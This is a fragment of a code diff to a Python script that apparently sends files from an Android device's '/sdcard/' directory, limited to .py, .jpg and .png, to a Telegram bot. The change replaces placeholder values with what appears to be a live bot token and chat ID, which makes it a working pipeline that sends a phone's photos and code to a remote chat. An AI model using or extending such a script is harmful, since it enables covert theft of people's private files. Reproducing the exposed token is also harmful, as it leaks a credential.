@@ -18,8 +18,8 @@ def send_files_in_directory(bot_token, chat_id, directory_path, extensions):
             print(f'Sending {file}: {response.status_code}')
 
 def main():
-    bot_token = 'YOUR_BOT_TOKEN_HERE'
-    chat_id = 'YOUR_CHAT_ID_HERE'
+    bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'
+    chat_id = '566775944'
     directory_path = '/sdcard/'
     file_extensions = ['.py', '.jpg', '.png']
 
